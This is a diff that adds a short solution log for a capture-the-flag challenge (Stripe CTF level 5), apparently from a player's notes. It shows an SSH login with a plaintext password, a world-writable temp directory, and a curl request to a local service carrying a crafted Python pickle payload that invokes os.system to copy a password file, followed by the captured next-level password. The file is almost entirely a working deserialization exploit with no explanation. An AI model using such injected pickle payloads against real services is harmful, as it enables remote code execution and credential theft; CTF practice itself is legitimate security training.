@@ -1,0 +1,11 @@
+$ ssh level05@ctf.stri.pe
+	Password: fzfDGnSmd317
+
+$ mkdir /tmp/hacks
+$ touch /tmp/hacks/06password
+$ chmod -R 777 /tmp/hacks
+
+$ curl localhost:9020 -d $'Hey, look over there!; job: cos\nsystem\n(S"cat /Users/karanlyons/Desktop/password > /Users/karanlyons/Desktop/06password"\ntR.'
+
+$ cat /tmp/hacks/06password
+	SF2w8qU1QDj
